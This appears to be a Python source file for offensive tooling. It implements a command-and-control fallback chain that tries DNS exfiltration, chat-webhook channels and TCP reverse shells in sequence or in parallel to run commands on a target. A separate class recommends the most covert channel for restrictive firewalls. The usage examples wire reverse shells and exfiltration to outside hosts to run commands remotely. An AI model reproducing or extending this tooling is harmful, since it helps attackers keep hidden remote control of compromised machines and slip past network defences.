#!/usr/bin/env python3
"""
C2 Fallback Chain System
Automatically try multiple C2 methods until one succeeds

Usage:
    chain = C2FallbackChain([
        DNSExfiltration(dns_server="1.2.3.4", domain="e.com"),
        SlackWebhook(webhook_url="https://hooks.slack.com/..."),
        TCPReverseShell(lhost="1.2.3.4", lport=4444),
    ])
    method, output = chain.execute(cmd="id", timeout=120)
"""

from typing import List, Optional, Tuple, Dict, Any
from c2_methods import C2Method, C2Registry
import threading
import time


class C2FallbackChain:
    """
    Manages a prioritized chain of C2 methods.
    Attempts each method in order until one succeeds.
    """
    
    def __init__(self, methods: List[C2Method] = None, prefer_interactive: bool = False):
        """
        Initialize fallback chain.
        
        Args:
            methods: List of C2Method instances to try in order
            prefer_interactive: Sort by interactive=True first
        """
        if methods is None:
            # Use default registry, sorted by priority
            methods = []
            for method_class in C2Registry.get_by_priority():
                try:
                    methods.append(method_class())
                except Exception:
                    pass
        
        self.methods = methods
        if prefer_interactive:
            self.methods.sort(key=lambda m: (not m.supports_interactive, m.priority))
        else:
            self.methods.sort(key=lambda m: m.priority)
        
        self.active_method = None
        self.results = []
        self.attempted = []
    
    def execute(self, cmd: str, timeout: float = 120.0, 
                skip_methods: List[str] = None, require_interactive: bool = False) -> Tuple[Optional[C2Method], Optional[str]]:
        """
        Execute command via fallback chain.
        
        Args:
            cmd: Shell command to execute
            timeout: Timeout for entire chain (includes listener setup + execution)
            skip_methods: List of method names to skip (e.g., ["tcp", "http"])
            require_interactive: Only use methods that support interactive shell
            
        Returns:
            Tuple of (active_method, output) or (None, None) if all fail
        """
        skip_methods = skip_methods or []
        chain_start = time.time()
        
        for method in self.methods:
            # Check skip list
            if method.name in skip_methods:
                self.attempted.append((method.name, "SKIPPED"))
                continue
            
            # Check interactive requirement
            if require_interactive and not method.supports_interactive:
                self.attempted.append((method.name, "NOT_INTERACTIVE"))
                continue
            
            # Check timeout
            elapsed = time.time() - chain_start
            remaining = timeout - elapsed
            if remaining <= 0:
                self.attempted.append((method.name, "TIMEOUT"))
                break
            
            method_timeout = min(remaining, 60.0)  # 60 sec per method
            
            try:
                self._log(f"Trying C2 method: {method.name}", "info")
                
                # Start listener
                listener_ok = method.start_listener()
                if not listener_ok:
                    self._log(f"Method {method.name}: listener failed", "warn")
                    self.attempted.append((method.name, "LISTENER_FAIL"))
                    method.cleanup()
                    continue
                
                self._log(f"Method {method.name}: listener started", "debug")
                
                # Generate payload
                try:
                    payload = method.generate_payload(cmd)
                    self._log(f"Method {method.name}: payload ready ({len(payload)} bytes)", "debug")
                except Exception as e:
                    self._log(f"Method {method.name}: payload generation failed: {e}", "warn")
                    self.attempted.append((method.name, "PAYLOAD_FAIL"))
                    method.cleanup()
                    continue
                
                # Wait for output (simulated - actual injection would happen in exploit phase)
                output = method.wait_output(timeout=method_timeout)
                
                if output:
                    self.active_method = method
                    self.results.append((method.name, "SUCCESS", output))
                    self.attempted.append((method.name, "SUCCESS"))
                    self._log(f"Method {method.name}: SUCCESS ({len(output)} bytes output)", "success")
                    return method, output
                else:
                    self._log(f"Method {method.name}: no output received", "warn")
                    self.attempted.append((method.name, "NO_OUTPUT"))
                    method.cleanup()
                    continue
                    
            except Exception as e:
                self._log(f"Method {method.name}: exception: {e}", "error")
                self.attempted.append((method.name, f"EXCEPTION: {str(e)[:30]}"))
                try:
                    method.cleanup()
                except Exception:
                    pass
                continue
        
        self._log(f"Fallback chain exhausted after {time.time() - chain_start:.1f}s", "error")
        return None, None
    
    def get_summary(self) -> Dict[str, Any]:
        """Return summary of chain execution"""
        return {
            "total_methods": len(self.methods),
            "attempted": len(self.attempted),
            "active_method": self.active_method.name if self.active_method else None,
            "attempts": self.attempted,
            "success": self.active_method is not None,
        }
    
    def _log(self, msg: str, level: str = "info"):
        """Log message (override for custom logging)"""
        prefix = {
            "debug": "[*]",
            "info": "[+]",
            "success": "[✓]",
            "warn": "[!]",
            "error": "[-]",
        }.get(level, "[*]")
        print(f"{prefix} {msg}")


class ParallelC2Chain:
    """
    Try multiple C2 methods in parallel.
    Returns first successful result.
    """
    
    def __init__(self, methods: List[C2Method]):
        self.methods = methods
        self.results = []
        self.winner = None
        self.lock = threading.Lock()
    
    def execute(self, cmd: str, timeout: float = 120.0) -> Tuple[Optional[C2Method], Optional[str]]:
        """Execute all methods in parallel, return first success"""
        threads = []
        stop_event = threading.Event()
        
        def try_method(method, idx):
            if stop_event.is_set():
                return
            
            try:
                if not method.start_listener():
                    return
                
                payload = method.generate_payload(cmd)
                output = method.wait_output(timeout=timeout)
                
                if output:
                    with self.lock:
                        if not self.winner:
                            self.winner = (method, output)
                            stop_event.set()
                        self.results.append((method.name, "SUCCESS", output))
                
            except Exception as e:
                self.results.append((method.name, "FAILED", str(e)))
            finally:
                try:
                    method.cleanup()
                except Exception:
                    pass
        
        # Start all threads
        for i, method in enumerate(self.methods):
            t = threading.Thread(target=try_method, args=(method, i), daemon=True)
            t.start()
            threads.append(t)
        
        # Wait for timeout or winner
        start = time.time()
        while (time.time() - start) < timeout:
            if stop_event.is_set():
                break
            time.sleep(0.1)
        
        # Wait for threads to finish
        for t in threads:
            t.join(timeout=1)
        
        if self.winner:
            return self.winner
        return None, None


class C2MethodAnalyzer:
    """Analyze and recommend best C2 method for given constraints"""
    
    @staticmethod
    def recommend(target_public_ip: bool = False, 
                  need_interactive: bool = False,
                  firewall_type: str = "restrictive") -> List[C2Method]:
        """
        Recommend C2 methods based on constraints.
        
        Args:
            target_public_ip: Whether target has public IP
            need_interactive: Whether interactive shell needed
            firewall_type: "open"|"moderate"|"restrictive"
            
        Returns:
            List of recommended methods sorted by priority
        """
        recommended = []
        
        for method_class in C2Registry.get_by_priority():
            method = method_class()
            
            # Skip methods that don't fit constraints
            if need_interactive and not method.supports_interactive:
                continue
            
            if not target_public_ip and method.requires_public_ip:
                # Only for very restrictive firewalls
                if firewall_type != "restrictive":
                    continue
            
            # Score methods by firewall type
            if firewall_type == "open":
                # Any method works, but prefer direct
                score = 0 if method.requires_public_ip else 10
            elif firewall_type == "moderate":
                # Prefer non-direct methods
                if method.name in ["dns", "icmp", "ws"]:
                    score = 5
                elif method.name in ["http", "slack", "discord", "telegram"]:
                    score = 10
                else:
                    score = 20
            else:  # restrictive
                # Prefer covert methods
                if method.name in ["dns", "slack", "discord", "telegram"]:
                    score = 5
                elif method.name in ["ws", "http"]:
                    score = 15
                else:
                    score = 25
            
            recommended.append((score, method))
        
        return [m for _, m in sorted(recommended)]


if __name__ == "__main__":
    # Example usage
    print("C2 Fallback Chain Test")
    print("=" * 50)
    
    from c2_methods import TCPReverseShell, DNSExfiltration, SlackWebhook
    
    # Create chain
    methods = [
        DNSExfiltration(dns_server="8.8.8.8", domain="test.com"),
        SlackWebhook(webhook_url="https://hooks.slack.com/test"),
        TCPReverseShell(lhost="127.0.0.1", lport=9999),
    ]
    
    chain = C2FallbackChain(methods)
    print("\nChain created with methods:")
    for m in methods:
        print(f"  - {m.name}: {m.description}")
    
    print("\nAnalyzer recommendations:")
    analyzer = C2MethodAnalyzer()
    recommendations = analyzer.recommend(target_public_ip=False, firewall_type="restrictive")
    for method in recommendations:
        print(f"  - {method.name}: {method.description}")
